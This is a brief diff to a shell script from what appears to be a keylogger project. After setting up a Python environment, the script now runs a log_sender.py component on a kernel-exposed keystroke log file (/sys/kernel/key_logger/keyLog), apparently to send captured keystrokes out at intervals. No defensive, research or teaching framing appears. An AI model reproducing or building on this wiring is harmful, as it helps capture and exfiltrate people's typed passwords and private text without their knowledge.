@@ -29,5 +29,6 @@ source ../myenv/bin/activate
 pip install python-dotenv
 echo "Running script in: "
 echo $(which python)
-$(which python) ../BE/log_sender.py -f  -t 5
+$(which python) ../BE/log_sender.py -f /sys/kernel/key_logger/keyLog  -t 4
+  
 
